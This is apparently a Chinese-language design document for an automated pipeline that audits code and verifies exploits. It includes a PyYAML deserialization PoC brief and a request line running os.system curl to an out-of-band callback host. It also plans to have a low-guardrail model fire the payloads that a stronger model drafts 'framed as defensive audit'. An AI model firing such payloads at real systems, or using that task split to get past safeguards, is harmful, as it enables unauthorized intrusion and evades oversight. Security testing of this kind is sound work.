- id: f-v000                        # 早期接地追加的 verification fact，不改 f-c001
  type: verification
  verifies: f-c001
  confidence: reachable-confirmed   # 实况确认：不带 token 打 /api/import 返回 200 而非 401
  description: "实况接地：未认证请求 /api/import 返回 200，绕过鉴权成立"
  code_version: "a1b2c3d"

- id: f-d001
  type: dataflow
  description: "config 字段未经 sanitize：request.files['config'] → parse_config() → yaml.load(data)"
  confidence: static-confirmed
  locations: ["app/api/import_bp.py:38", "app/config_loader.py:12", "app/config_loader.py:19"]
  code_version: "a1b2c3d"

- id: f-k001
  type: sink
  description: "yaml.load 使用默认 FullLoader 之外的不安全 Loader，可构造 !!python/object/apply 执行任意命令"
  confidence: static-confirmed
  locations: ["app/config_loader.py:19"]
  code_version: "a1b2c3d"
```

**PoC Brief（审计→验证交接，强模型产出到此为止）**

```yaml
poc_brief:
  chain: [f-s001, f-c001, f-d001, f-k001]   # 含负向节点 c001
  entry:
    endpoint: "POST /api/import"
    precondition: none                       # c001 已证明无需鉴权
  dataflow: "multipart 字段 config → import_bp.py:38 读入 → config_loader.py:12 parse_config → :19 yaml.load"
  payload_recipe:
    gadget: "PyYAML !!python/object/apply:os.system"
    shape: "合法 YAML 顶层文档，内嵌 !!python/object/apply:os.system 执行带外探针命令；避免换行破坏 multipart 边界"
  success_signature:
    kind: oob_callback
    check: "验证机监听的 HTTP 端点收到含唯一 token 的回连请求"
  constraints_to_bypass: [f-c001]
```

**Harness 返回（两种结局）**

```yaml
# 成功 → 不改 f-k001，而是追加一个 verification fact 指向它；f-k001 有效 confidence 折叠为 poc-confirmed
harness_result:
  triggered: true
  evidence: "OOB 服务器收到 GET /cb?t=9f3a1e（token 匹配），间隔 0.4s"
  request: "POST /api/import ... config=!!python/object/apply:os.system ['curl http://oob/cb?t=9f3a1e']"
  response: "200 {\"status\":\"imported\"}"
  why_failed: null
  observed_routing: null

# server 据此追加（append-only，f-k001 原样保留）：
- id: f-v001
  type: verification
  verifies: f-k001
  confidence: poc-confirmed
  description: "yaml.load RCE 实况打通：OOB 回连命中唯一 token"
  code_version: "a1b2c3d"
  evidence: "poc_ref://runs/.../f-v001（含完整 request/response，代理已留档）"

# 失败 → 追加 refuted verification fact + 新 constraint fact（实况负向证据），反向制导审计 worker；f-k001 原样保留
harness_result:
  triggered: false
  evidence: null
  request: "POST /api/import ... config=!!python/object/apply:os.system [...]"
  response: "200 {\"status\":\"imported\"}"      # 200 但无回连 → 200 ≠ 成功
  why_failed:
    reason: sanitized
    detail: "config_loader 实际调用的是 yaml.safe_load（基座 bk 记录的 loader 版本已过时）；!!python/object 被拒"
  observed_routing: null
```

失败这条尤其有价值：它同时暴露了**基座知识过时**（loader 类型判断错了）→ 触发 `revised_by` 打补丁，并生成一条实况 `sanitized` 负向 fact，让审计 worker 换 gadget 或换 sink，而不是反复重试同一 payload。

---

## MopMonk 对照

Cairn 的图本身就是结构化记忆，MopMonk 提供的是丰富每个节点的类型学：

| MopMonk 记忆类别 | 落到本设计 |
|---|---|
| Vulnerability-goal | `goal` + `Hint` |
| Code-path memory | source/sink/dataflow/reachability fact + Intent 边 + 基座 routing_map |
| Negative-evidence | `type: constraint` 负向 fact + harness 的 `why_failed` |
| Verification-state | `type: verification` fact（append-only）+ server 折叠出的 confidence 视图 |
| Next-constraint | Intent 的 description |
| Candidate-PoC / Input-format | PoC Brief 的 `payload_recipe` + 验证循环回写的 evidence |

真正值得抄的核心只有一个：**负向证据一等公民化**。

---

## 开放问题：合规与授权边界（留待与同事讨论）

验证 worker 会用**许可度更高的模型**对**实况环境发真实攻击 payload**——这是整套设计里合规风险最集中的一环，必须在工程上划死边界。容器拓扑本身已在决策 #8 拍板（验证走独立 profile、出站强制过 harness 代理）；以下几条是在该拓扑之上仍需和同事拍板的策略项，不是已定结论：

1. **靶标白名单（硬约束）。** 验证 worker 只能打显式配置的测试环境 host/端口（来源：`origin.allowlist`，见决策 #9）；带外回连地址也走 allowlist。任何超出范围的目标由 harness 层直接拒绝，而非依赖模型自觉。
2. **代理是强制审计轨 + 人工闸门。** 所有攻击流量必须过代理留档；v1 阶段代理面板同时充当"开火前人工确认"的闸门（复用 `Hint`）。要不要在 v1 强制"人不点确认就不发包"，是一个体验/安全权衡。
3. **围栏边界即职责边界。** 强模型只产出 PoC 配方（框成防御性代码审计，正当），许可度高的模型只做实例化 + 开火。组织策略上要明确：强模型永不被要求产出武器化成品，permissive 模型永不做超出 Brief 的自主决策。
4. **凭证与 kill-switch。** 测试环境凭证的存储/注入方式（`credentials_ref` 走 secret 存储、只注入 verify profile，见决策 #14），以及一个能立即中止所有在跑验证 run 的开关，属于运维硬需求。

核心原则：**这些边界应由 harness/调度层强制，而不是寄希望于模型的对齐。** 模型选择（用低围栏模型开火）本身就意味着不能把安全托付给模型自觉。

---

## 已知限制

1. **纯静态部分产出的是 `hypothesized`，实证依赖测试环境可用。** 无测试环境时天花板停在"plausible chain"，需人工 Hint 补足 confidence。
2. **源码路由 → 实况端点映射在有网关/反向代理重写时会断。** 靠验证 worker 现场用浏览器解析 + 回补 `routing_map` 兜底。
3. **首扫基座若错误，会被下游继承。** 靠 `revised_by` 打补丁 + 实况早期接地缓解，但不能完全消除。
4. **验证 worker 很重（读码 + 驱动工具 + 多轮迭代），必须被 gate。** 只在 Reason 组装出完整候选链时开火，不对每个假设都验。
5. **持久 Fact 库有腐烂风险。** 代码在两次 run 之间演进会使旧 fact 失效；靠 `code_version` 绑定缓解——底层代码变动时，折叠视图不再采信失配的 verification fact，节点自动降为待重验（**不改任何存储字段，保持 append-only**）。但"多大改动算失效"的判定本身需要策略，且无法完全消除误判。
